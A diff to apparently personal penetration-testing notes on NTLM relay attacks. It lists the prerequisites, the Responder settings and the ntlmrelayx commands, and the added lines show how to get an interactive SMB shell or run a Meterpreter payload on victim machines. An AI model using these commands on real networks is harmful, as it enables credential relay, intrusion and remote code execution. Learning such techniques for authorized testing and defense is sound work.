@@ -19,3 +19,5 @@
  - Needs SMB signing to be disabled (SMB signing disabled means machine does not check where the hash came from), relayed creds must have admin priv on machine.
  - Turn off SMB and HTTP, we don't want to respond, listen on rsponder for hashes.
  - use ntlmrelayx `python ntlmrelayx -tf targets.txt -smb2support`. targets.txt will have IPs of victims.
+ - For newer kali `impacket-ntlmrelayx -tf targets.txt -smb2support`
+ - `-i` to get interactive smb shell, `-e meterpreter.exe`
